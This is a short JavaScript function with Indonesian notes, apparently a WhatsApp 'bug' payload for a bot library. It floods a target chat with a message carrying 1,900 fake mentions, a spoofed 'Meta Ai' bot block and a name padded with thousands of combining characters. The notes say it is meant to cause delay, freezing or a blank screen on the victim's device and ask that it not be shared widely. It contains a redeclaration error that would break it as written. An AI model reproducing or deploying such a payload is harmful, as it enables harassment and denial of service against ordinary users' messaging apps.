async function grupdelaynew(sock, target) {
    const mentionedList = Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`);
  const target = target;

  await sock.sendMessage(target, {
    text: "Dengan dasar nya wanita akan kalah dengan Kecantikan",
    contextInfo: {
      mentionedJid: mentionedList,
      isGroupMention: true,
      participant: "0@s.whatsapp.net",
      expiration: 1,
      ForwardedAIBotMessageInfo: {
        botName: "Meta Ai",
        botJid: "13135550002@s.whatsapp.net",
        creatorName: "Amelia" + "ោ៝".repeat(5000)
      }
    }
  });
}
FUNCTION DELAY GROUP UPDATE NEW

EFFECT:
- DELAY
- TAG META AI
- FREEZE OR BLANK? ( NOT WORK ALL DEVICE )

NOTE: GAUSAH SHARE KE PT KECUALI OWN/Tangan Kanan.